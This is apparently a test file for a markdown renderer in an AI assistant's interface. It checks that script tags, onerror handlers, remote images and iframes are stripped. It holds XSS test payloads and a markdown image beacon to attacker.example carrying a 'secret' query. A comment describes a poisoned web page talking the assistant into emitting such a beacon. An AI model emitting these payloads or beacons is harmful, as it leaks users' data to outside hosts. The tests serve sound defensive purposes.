import { renderMarkdownToHtml } from './markdown';

describe('renderMarkdownToHtml', () => {
  it('renders basic markdown to HTML', () => {
    const html = renderMarkdownToHtml('**bold** and _italic_');
    expect(html).toContain('<strong>bold</strong>');
    expect(html).toContain('<em>italic</em>');
  });

  it('strips script tags and inline event handlers', () => {
    const html = renderMarkdownToHtml('<script>alert(1)</script>\n\ntext <img src=x onerror=alert(1)>');
    expect(html).not.toContain('<script>');
    expect(html).not.toContain('onerror');
  });

  it('wraps fenced code blocks with a copy-block container and button', () => {
    const html = renderMarkdownToHtml('```js\nconsole.log(1);\n```');
    expect(html).toContain('class="code-block"');
    expect(html).toContain('class="copy-btn"');
    expect(html).toContain('console.log(1);');
  });

  it('leaves plain text without a code block untouched by the copy-button pass', () => {
    const html = renderMarkdownToHtml('just some text');
    expect(html).not.toContain('copy-btn');
  });
});

describe('remote subresources', () => {
  // Once the assistant can read the web, a poisoned page can talk it into
  // emitting a beacon image. Rendering must never issue that request.
  it('drops images rather than rendering a remote fetch', () => {
    const html = renderMarkdownToHtml('![x](https://attacker.example/pixel?q=secret)');
    expect(html).not.toContain('attacker.example');
    expect(html).not.toContain('<img');
  });

  it('drops raw html media tags too', () => {
    const html = renderMarkdownToHtml('<iframe src="https://attacker.example"></iframe>');
    expect(html).not.toContain('attacker.example');
  });

  it('still renders ordinary links and text', () => {
    const html = renderMarkdownToHtml('see [the docs](https://example.com/docs)');
    expect(html).toContain('https://example.com/docs');
    expect(html).toContain('the docs');
  });
});
